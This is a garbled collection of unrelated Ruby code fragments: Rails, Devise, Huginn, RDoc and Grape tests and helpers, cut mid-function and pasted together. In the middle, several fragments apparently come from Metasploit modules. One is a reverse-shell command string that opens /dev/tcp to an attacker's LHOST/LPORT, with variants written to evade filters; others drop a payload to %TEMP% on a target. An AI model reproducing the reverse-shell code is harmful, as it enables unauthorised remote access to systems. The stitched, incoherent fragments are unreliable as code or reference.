
        
              migration2 = ChangeColumnDefault2.new
      migration2.migrate(:up)
      Horse.reset_column_information
      assert_equal 'Diomed', Horse.new.name
    
        initializer 'action_mailbox.config' do
      config.after_initialize do |app|
        ActionMailbox.logger = app.config.action_mailbox.logger || Rails.logger
        ActionMailbox.incinerate = app.config.action_mailbox.incinerate.nil? ? true : app.config.action_mailbox.incinerate
        ActionMailbox.incinerate_after = app.config.action_mailbox.incinerate_after || 30.days
        ActionMailbox.queues = app.config.action_mailbox.queues || {}
        ActionMailbox.ingress = app.config.action_mailbox.ingress
      end
    end
  end
end

    
        context 'running workers' do
      before do
        AgentRunner.class_variable_set(:@@agents, [HuginnScheduler, DelayedJobWorker])
        stub.instance_of(HuginnScheduler).setup
        stub.instance_of(DelayedJobWorker).setup
      end
    
        it 'work with set FAILED_JOBS_TO_KEEP env variable' do
      expect { @scheduler.send(:cleanup_failed_jobs!) }.to change(Delayed::Job, :count).by(-1)
      expect { @scheduler.send(:cleanup_failed_jobs!) }.to change(Delayed::Job, :count).by(0)
      expect(@keep.id).to eq(Delayed::Job.order(:failed_at)[0].id)
    end
    
        it 'cleans up old logs when there are more than log_length' do
      stub(AgentLog).log_length { 4 }
      AgentLog.log_for_agent(agents(:jane_website_agent), 'message 1')
      AgentLog.log_for_agent(agents(:jane_website_agent), 'message 2')
      AgentLog.log_for_agent(agents(:jane_website_agent), 'message 3')
      AgentLog.log_for_agent(agents(:jane_website_agent), 'message 4')
      expect(agents(:jane_website_agent).logs.order('agent_logs.id desc').first.message).to eq('message 4')
      expect(agents(:jane_website_agent).logs.order('agent_logs.id desc').last.message).to eq('message 1')
      AgentLog.log_for_agent(agents(:jane_website_agent), 'message 5')
      expect(agents(:jane_website_agent).logs.order('agent_logs.id desc').first.message).to eq('message 5')
      expect(agents(:jane_website_agent).logs.order('agent_logs.id desc').last.message).to eq('message 2')
      AgentLog.log_for_agent(agents(:jane_website_agent), 'message 6')
      expect(agents(:jane_website_agent).logs.order('agent_logs.id desc').first.message).to eq('message 6')
      expect(agents(:jane_website_agent).logs.order('agent_logs.id desc').last.message).to eq('message 3')
    end
    
        if authenticated && resource = warden.user(resource_name)
      flash[:alert] = I18n.t('devise.failure.already_authenticated')
      redirect_to after_sign_in_path_for(resource)
    end
  end
    
        def reset_password_instructions(record, token, opts={})
      @token = token
      devise_mail(record, :reset_password_instructions, opts)
    end
    
      private
    
          # Forgets the given resource by deleting a cookie
      def forget_me(resource)
        scope = Devise::Mapping.find_scope!(resource)
        resource.forget_me!
        cookies.delete(remember_key(resource, scope), forget_cookie_values(resource))
      end
    
            !!user
      end
    
          # Set up a subject doing an I18n lookup. At first, it attempts to set a subject
      # based on the current mapping:
      #
      #   en:
      #     devise:
      #       mailer:
      #         confirmation_instructions:
      #           user_subject: '...'
      #
      # If one does not exist, it fallbacks to ActionMailer default:
      #
      #   en:
      #     devise:
      #       mailer:
      #         confirmation_instructions:
      #           subject: '...'
      #
      def subject_for(key)
        I18n.t(:'#{devise_mapping.name}_subject', scope: [:devise, :mailer, key],
          default: [:subject, key.to_s.humanize])
      end
    end
  end
end

    
          # Valid client connection?
      if (client)
        # Increment the has connection counter
        self.pending_connections += 1
    
        # Plus characters ('+') in a uri are converted to spaces, so replace
    # them with something that PHP will turn into a plus.  Slashes cause
    # parse errors on the server side, so do the same for them.
    b64.gsub!('+', '.chr(43).')
    b64.gsub!('/', '.chr(47).')
    
      #
  # Returns the command string to use for execution
  #
  def command_string
    fd = rand(200) + 20
    return '0<&#{fd}-;exec #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']};sh <&#{fd} >&#{fd} 2>&#{fd}';
    # same thing, no semicolons
    #return '/bin/bash #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} <&#{fd} >&#{fd}'
    # same thing, no spaces
    #return 's=${IFS:0:1};eval$s\'bash${s}#{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']}$s<&#{fd}$s>&#{fd}&\''
  end
end

    
        uuid ||= generate_payload_uuid
    uri  = generate_uri_uuid(sum, uuid, len)
    record_payload_uuid_url(uuid, uri)
    
    
    
        when /osx|bsd/
      [
        '/Applications/Google Chrome.app',
        '/Applications/Firefox.app'
      ].each do |browser_path|
        if file?(browser_path)
          found_browser_path = browser_path
          break
        end
      end
    when /linux|unix/
      # Need to add support for Linux in the future.
      # But you see, the Linux meterpreter is so broken there is no point
      # to do it now. You can't test anyway.
    end
    
        # Write script to %TEMP% on target
    script_on_target = write_exe_to_target(raw, rexename)
    
      def test_param_list_params_block_params
    m = RDoc::AnyMethod.new nil, 'method'
    m.parent = @c1
    
      def test_module_extended
    m1 = @xref_data.add_module RDoc::NormalModule, 'Mod1'
                  m1.add_module RDoc::NormalModule, 'Mod3'
    m1_m2       = m1.add_module RDoc::NormalModule, 'Mod2'
    m1_m2_m3    = m1_m2.add_module RDoc::NormalModule, 'Mod3'
                  m1_m2_m3.add_module RDoc::NormalModule, 'Mod4'
                  m1_m2.add_module RDoc::NormalModule, 'Mod4'
    m1_m2_k0    = m1_m2.add_class RDoc::NormalClass, 'Klass0'
    m1_m2_k0_m4 = m1_m2_k0.add_module RDoc::NormalModule, 'Mod4'
                  m1_m2_k0_m4.add_module RDoc::NormalModule, 'Mod6'
                  m1_m2_k0.add_module RDoc::NormalModule, 'Mod5'
    
      def setup
    super
    @po = RDoc::Generator::POT::PO.new
  end
    
        expected = [
      'now is the time',
      '\n',
      '  hello\n  dave\n',
      '1: ',
      'l1',
      '1: ',
      'l2',
    ]
    
    
    
      # The test environment is used exclusively to run your application's
  # test suite. You never need to work with it otherwise. Remember that
  # your test database is 'scratch space' for the test suite and is wiped
  # and recreated between test runs. Don't rely on the data there!
  config.cache_classes = true
    
          def title
        'Comparison of #{@page.title}'
      end
    
          def js # custom js
        @js
      end
    
    def normal(text)
  text.gsub!(' ', '')
  text.gsub!('\n', '')
  text
end
    
    desc 'Validate lib files and version file'
task :validate do
  libfiles = Dir['lib/*'] - ['lib/#{name}.rb', 'lib/#{name}']
  unless libfiles.empty?
    puts 'Directory `lib` should only contain a `#{name}.rb` file and `#{name}` dir.'
    exit!
  end
  unless Dir['VERSION*'].empty?
    puts 'A `VERSION` file at root level violates Gem best practices.'
    exit!
  end
end

    
      chain :with do |attrs|
    @expected_attrs = attrs
  end
    
    # Copied from minitest.
def capture_io
  require 'stringio'
    
          def translate(key, **options)
        options = options.dup
        options[:default] &&= options[:default].to_s
        message = ::I18n.translate(key, **options)
        message.present? ? message : fallback_message(key, **options)
      end
    
                get '/', a: { a: 1, b: 2 }
            expect(last_response.status).to eq(400)
            expect(last_response.body).to eq('a is invalid')
    
      module Middleware
    extend ::ActiveSupport::Autoload
    autoload :Base
    autoload :Versioner
    autoload :Formatter
    autoload :Error
    autoload :Globals
    autoload :Stack
    
        class LazyValueHash < LazyValueEnumerable
      def initialize(hash)
        super
        @value_hash = {}.with_indifferent_access
        hash.each do |key, value|
          self[key] = value
        end
      end
    
              get '/location'
          expect(last_response.body).to eq 'response value'
        end
      end
    
            # Specify a custom formatter for a content-type.
        def formatter(content_type, new_formatter)
          namespace_stackable(:formatters, content_type.to_sym => new_formatter)
        end